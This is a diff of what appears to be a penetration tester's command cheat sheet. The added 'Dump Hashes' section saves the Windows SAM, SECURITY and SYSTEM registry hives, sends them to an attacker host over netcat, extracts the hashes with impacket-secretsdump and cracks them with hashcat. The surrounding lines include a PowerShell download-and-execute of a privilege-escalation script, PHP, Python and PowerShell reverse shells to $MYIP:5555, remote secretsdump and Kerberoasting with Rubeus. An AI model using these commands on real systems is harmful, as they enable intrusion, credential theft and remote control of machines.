@@ -1009,7 +1009,22 @@ Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
-+---------- Dump Hashes ----------+
++---------- Dump Hashes (Local / Remote)----------+
+cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system
+
+cmd /c "nc.exe $MYIP 4444 -w 3 < sam"
+nc -lvp 4444 > sam
+cmd /c "nc.exe $MYIP 4444 -w 3 < security"
+nc -lvp 4444 > security
+cmd /c "nc.exe $MYIP 4444 -w 3 < system"
+nc -lvp 4444 > system
+
+impacket-secretsdump -sam sam -system system -security security LOCAL
+echo 'Administrator:500:...................' > hashes
+hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
+
+
+
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 
@@ -1135,12 +1150,6 @@ php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
 powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
-
-[*] SAM
-cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM; reg save hklm\security SECURITY
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
-echo 'Administrator:500:...................' > hashes
-hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
 
 [*] Rubeus
 Rubeus.exe kerberoast
